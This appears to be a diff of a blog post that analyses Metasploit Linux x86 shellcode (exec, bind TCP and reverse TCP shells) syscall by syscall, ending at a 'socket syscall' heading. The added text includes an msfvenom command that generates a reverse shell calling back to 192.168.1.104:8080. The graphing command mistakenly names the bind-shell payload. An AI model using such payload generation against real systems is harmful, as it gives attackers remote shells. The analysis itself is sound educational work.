@@ -56,7 +56,7 @@ Aaah! Looks pretty familiar now doesn't it? Some of you might have even analyzed
 First, we push 0x0b or 11 in decimal which is the syscall number for execve() into the stack and pop it into EAX which should contain the syscall number remember? Then we clear EDX register using `cwd` and push it into the stack. After that we proceed with setting up the arguments for execve() which in this case is "/bin/sh"(0x68732f = **hs/** & 0x6e69622f = **nib/**). Note that `/bin/sh` is reversed due to the little-endianess of the x86 architecture and also note that the usage of **-c** flag(0x632d) which actually reads the command from the _command_string_ rather than STDIN. Finally, we execute the execve syscall using the good old software interrupt _80h_.
 
 ## Analyzing linux/x86/shell_bind_tcp shellcode
-This is a standard bind TCP shell payload(stageless) from Metasploit.
+This is a standard bind TCP shell payload(stageless) from the Metasploit framework.
 
 We can generate the payload using the following command:
 ```
@@ -108,3 +108,33 @@ In this step we just increment `EBX` by 1 making it 0x05 which is equal to SYS_A
 ### dup2 syscall
 We are going to duplicate into our accepted connection socket which we got back from the previous step the STDIN/0, STDOUT/1, and STDERR/2 file descriptors(fd) to make the connection interactive in this step. In the first instruction, `EBX` now has the value of `EAX` which contains the connection socket. `ECX` will be used as the counter register here. After that, the syscall value for dup2 is pushed into the stack and the syscall is executed. For the next iteration, the `ECX` is decremented and the loop continues until the Sign Flag(SF) is not set.
 ### execve syscall
+The last step is actually all too familiar now that is executing the "/bin/sh" to enable the attackers to execute any command on the machine remotely. There is not much to discuss here as it's pretty standard.
+
+## Analyzing linux/x86/shell_reverse_tcp shellcode
+This is again a standard Reverse TCP payload(not to be confused with Meterpreter!) from the Metasploit framework.
+
+Generation of the shellcode is as easy as:
+```
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.104 LPORT=8080 -f c
+```
+
+And the graph as follows:
+```
+msfvenom -p linux/x86/shell_bind_tcp LHOST=192.168.1.104 LPORT=8080 -f raw | sctest -vvv -Ss 100000 -G linux-x86-reverseshell.dot
+
+dot linux-x86-reverseshell.dot -Tpng -o linux-x86-reverseshell.png
+```
+
+Here is the diagram which we will analyze:
+
+![linux-x86-reverseshell](../assets/images/linux-x86-reverseshell.png "linux-x86-reverseshell")
+
+When that's done let's move in for the detailed analysis but not before identifying the syscalls first which are:
+
+1. socket()
+2. dup2()
+3. connect()
+4. execve()
+
+### socket syscall
+
